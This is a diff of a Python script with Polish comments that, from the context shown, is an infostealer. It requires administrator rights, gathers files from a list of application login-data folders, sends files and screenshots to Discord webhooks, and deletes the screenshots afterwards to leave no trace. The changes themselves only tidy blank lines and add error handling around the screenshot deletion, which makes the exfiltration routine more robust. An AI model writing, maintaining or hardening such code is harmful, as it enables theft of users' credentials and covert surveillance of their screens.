@@ -16,7 +16,6 @@ if not os.access(users_directory, os.W_OK):
     print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
     sys.exit(1)
 
-
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
     try:
@@ -32,7 +31,6 @@ def send_file_to_discord(file_path, webhook_url):
             print(f"Błąd przy wysyłaniu {file_path}: {response.status_code} - {response.text}")
     except Exception as e:
         print(f"Błąd przy otwieraniu pliku {file_path}: {e}")
-
 
 # Lista folderów aplikacji
 login_data_paths = {
@@ -110,8 +108,11 @@ def send_screenshot_to_discord():
         send_file_to_discord(screenshot_file, webhook_url_1)
         
         # Usuwanie zrzutu ekranu po wysłaniu
-        os.remove(screenshot_path)
-        print(f"Zrzut ekranu wysłany na Discord i usunięty z dysku.")
+        try:
+            os.remove(screenshot_path)
+            print(f"Zrzut ekranu wysłany na Discord i usunięty z dysku.")
+        except Exception as e:
+            print(f"Błąd przy usuwaniu zrzutu ekranu: {e}")
     else:
         print("Błąd przy robieniu zrzutu ekranu.")
 
